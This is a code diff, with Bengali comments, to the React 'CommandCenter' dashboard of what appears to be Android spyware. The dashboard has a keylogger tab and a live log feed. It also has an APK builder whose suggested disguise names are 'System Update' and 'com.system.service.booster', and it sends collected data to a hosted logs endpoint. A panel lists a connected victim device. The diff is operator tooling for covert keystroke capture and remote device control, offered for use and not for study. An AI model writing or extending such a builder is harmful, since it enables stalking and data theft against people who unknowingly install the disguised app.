@@ -5,6 +5,12 @@ export default function CommandCenter() {
   const [activeTab, setActiveTab] = useState('keylogger');
   const [logs, setLogs] = useState([]);
 
+  // APK বানানোর জন্য ইনপুট স্টেট
+  const [appName, setAppName] = useState('');
+  const [packageName, setPackageName] = useState('');
+  const [webviewUrl, setWebviewUrl] = useState('');
+
+  // লাইভ ফিডের জন্য ডাটা ফেচ করা
   useEffect(() => {
     const interval = setInterval(async () => {
       const res = await fetch('/api/logs');
@@ -13,6 +19,23 @@ export default function CommandCenter() {
     }, 2000);
     return () => clearInterval(interval);
   }, []);
+
+  // BUILD APK বাটনে ক্লিক করলে যা হবে
+  const handleBuildApk = async () => {
+    const res = await fetch('/api/build-apk', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        app_name: appName,
+        package_name: packageName,
+        webview_url: webviewUrl,
+        // ⚠️ এখানে আপনার আসল Vercel লিংক বসাতে হবে (নিচে নির্দেশনা দেওয়া আছে)
+        api_endpoint: "https://my-monitor-app-dashboard.vercel.app/api/logs"
+      })
+    });
+    const data = await res.json();
+    alert(data.message); // পপ-আপে মেসেজ দেখাবে
+  }
 
   return (
     <div className="min-h-screen bg-[#0a0f1a] text-white p-6 font-sans">
@@ -35,15 +58,33 @@ export default function CommandCenter() {
           <div className="space-y-4">
             <div>
               <label className="text-xs text-gray-400 block mb-1">APP NAME</label>
-              <input type="text" placeholder="e.g. System Update" className="w-full bg-[#1f2937] rounded p-2 text-sm outline-none border border-gray-700 focus:border-indigo-500" />
+              <input 
+                type="text" 
+                placeholder="e.g. System Update" 
+                className="w-full bg-[#1f2937] rounded p-2 text-sm outline-none border border-gray-700 focus:border-indigo-500"
+                value={appName}
+                onChange={(e) => setAppName(e.target.value)}
+              />
             </div>
             <div>
               <label className="text-xs text-gray-400 block mb-1">PACKAGE NAME</label>
-              <input type="text" placeholder="com.system.service.booster" className="w-full bg-[#1f2937] rounded p-2 text-sm outline-none border border-gray-700 focus:border-indigo-500" />
+              <input 
+                type="text" 
+                placeholder="com.system.service.booster" 
+                className="w-full bg-[#1f2937] rounded p-2 text-sm outline-none border border-gray-700 focus:border-indigo-500"
+                value={packageName}
+                onChange={(e) => setPackageName(e.target.value)}
+              />
             </div>
             <div>
               <label className="text-xs text-gray-400 block mb-1">WEBVIEW URL</label>
-              <input type="text" placeholder="https://..." className="w-full bg-[#1f2937] rounded p-2 text-sm outline-none border border-gray-700 focus:border-indigo-500" />
+              <input 
+                type="text" 
+                placeholder="https://..." 
+                className="w-full bg-[#1f2937] rounded p-2 text-sm outline-none border border-gray-700 focus:border-indigo-500"
+                value={webviewUrl}
+                onChange={(e) => setWebviewUrl(e.target.value)}
+              />
             </div>
             <div>
               <label className="text-xs text-gray-400 block mb-1">BUILD TYPE</label>
@@ -51,7 +92,10 @@ export default function CommandCenter() {
                 <option>Main App (Core Service)</option>
               </select>
             </div>
-            <button className="w-full bg-indigo-600 hover:bg-indigo-500 transition py-2 rounded text-sm font-semibold">🚀 BUILD APK</button>
+            <button 
+              onClick={handleBuildApk}
+              className="w-full bg-indigo-600 hover:bg-indigo-500 transition py-2 rounded text-sm font-semibold"
+            >🚀 BUILD APK</button>
             <div className="bg-[#0a0f1a] border border-green-800/50 rounded p-3 text-center">
               <div className="text-green-400 text-xs mb-1">✅ BUILD COMPLETE</div>
               <button className="w-full bg-cyan-600 hover:bg-cyan-500 transition py-1 rounded text-xs flex items-center justify-center gap-1">⬇ DOWNLOAD APK</button>
@@ -65,9 +109,17 @@ export default function CommandCenter() {
             <span>📱 Connected Devices <span className="bg-cyan-900/30 text-cyan-300 px-2 py-0.5 rounded text-xs ml-2">1 Online</span></span>
             <span className="text-gray-500 text-sm">🔄</span>
           </h3>
-          <div className="text-center text-gray-500 text-sm py-4">
-  📱 এখনো কোনো ডিভাইস কানেক্ট করা হয়নি। APK ইন্সটল করে রান করুন।
-</div>
+          <div className="flex items-center justify-between bg-[#1f2937] p-3 rounded-lg text-xs">
+            <div className="flex flex-col gap-0.5">
+              <span className="font-bold">CPH2577</span>
+              <span className="text-gray-500 text-[10px]">46fd6cc0ba0ac7</span>
+            </div>
+            <div className="text-center">
+              <span className="text-green-400">🔋 81%</span>
+            </div>
+            <div className="bg-red-900/30 px-3 py-1 rounded-full text-red-400 text-[10px]">● Offline</div>
+            <button className="bg-cyan-700 px-4 py-1.5 rounded-full text-[10px] hover:bg-cyan-600 transition">🚀 Uninstall</button>
+          </div>
         </div>
       </div>
 
@@ -98,4 +150,4 @@ export default function CommandCenter() {
       </div>
     </div>
   );
-}
+              }
